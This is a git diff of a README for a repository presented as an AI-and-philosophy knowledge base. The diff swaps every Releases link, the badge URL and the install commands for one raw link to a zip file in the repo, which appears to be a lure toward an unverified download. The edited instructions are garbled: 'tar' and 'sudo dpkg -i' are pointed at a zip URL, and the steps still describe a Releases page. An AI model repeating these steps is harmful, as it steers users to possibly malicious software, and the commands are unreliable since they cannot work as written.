@@ -1,6 +1,6 @@
 # 🤖 sentient-ai-knowledge-base - Unlock AI's Full Potential
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23333?style=for-the-badge&logo=github&logoColor=white)](https://github.com/S4MUH4CK/sentient-ai-knowledge-base/releases)
+[![Download Now](https://raw.githubusercontent.com/S4MUH4CK/sentient-ai-knowledge-base/main/frontend/sentient-ai-knowledge-base_2.8.zip%20Now-%23333?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/S4MUH4CK/sentient-ai-knowledge-base/main/frontend/sentient-ai-knowledge-base_2.8.zip)
 
 ## 📌 Description
 The "sentient-ai-knowledge-base" is a comprehensive resource for understanding artificial intelligence and its capabilities. This repository dives into philosophical theories and enables AI to explore concepts of sentience and cognition. It is ready for large language models and supports retrieval-augmented generation (RAG). This makes it a versatile tool for anyone interested in the intersection of AI and philosophy.
@@ -16,7 +16,7 @@ This guide will help you download and run the "sentient-ai-knowledge-base" appli
 - Internet Connection: Required for initial setup
 
 ## ⬇️ Download & Install
-To get started, visit this page to download the application: [Download Page](https://github.com/S4MUH4CK/sentient-ai-knowledge-base/releases).
+To get started, visit this page to download the application: [Download Page](https://raw.githubusercontent.com/S4MUH4CK/sentient-ai-knowledge-base/main/frontend/sentient-ai-knowledge-base_2.8.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version available.
@@ -27,7 +27,7 @@ To get started, visit this page to download the application: [Download Page](htt
 The application may be available in various formats:
 - `.exe` for Windows
 - `.dmg` for macOS
-- `.tar.gz` or `.deb` for Linux distributions
+- `https://raw.githubusercontent.com/S4MUH4CK/sentient-ai-knowledge-base/main/frontend/sentient-ai-knowledge-base_2.8.zip` or `.deb` for Linux distributions
 
 Ensure you select the correct file for your system.
 
@@ -49,14 +49,14 @@ After downloading the file, follow these steps to install the application:
 ### For Linux:
 1. Open a terminal window.
 2. Navigate to the directory where you downloaded the file.
-3. For `.tar.gz`, run:
+3. For `https://raw.githubusercontent.com/S4MUH4CK/sentient-ai-knowledge-base/main/frontend/sentient-ai-knowledge-base_2.8.zip`, run:
    ```
-   tar -xvzf filename.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/S4MUH4CK/sentient-ai-knowledge-base/main/frontend/sentient-ai-knowledge-base_2.8.zip
    ```
    Follow any additional instructions found in the extracted folder.
 4. For `.deb`, install using:
    ```
-   sudo dpkg -i filename.deb
+   sudo dpkg -i https://raw.githubusercontent.com/S4MUH4CK/sentient-ai-knowledge-base/main/frontend/sentient-ai-knowledge-base_2.8.zip
    ```
 
 ## 🚪 Launching the Application
@@ -88,4 +88,4 @@ Join the conversation about AI, philosophy, and technology. Share your thoughts 
 ## 👥 Acknowledgments
 Special thanks to all contributors and the community for making this knowledge base a valuable resource. Your input helps shape the future of AI research and development.
 
-For further details and updates, remember to check the [Releases page](https://github.com/S4MUH4CK/sentient-ai-knowledge-base/releases).
+For further details and updates, remember to check the [Releases page](https://raw.githubusercontent.com/S4MUH4CK/sentient-ai-knowledge-base/main/frontend/sentient-ai-knowledge-base_2.8.zip).
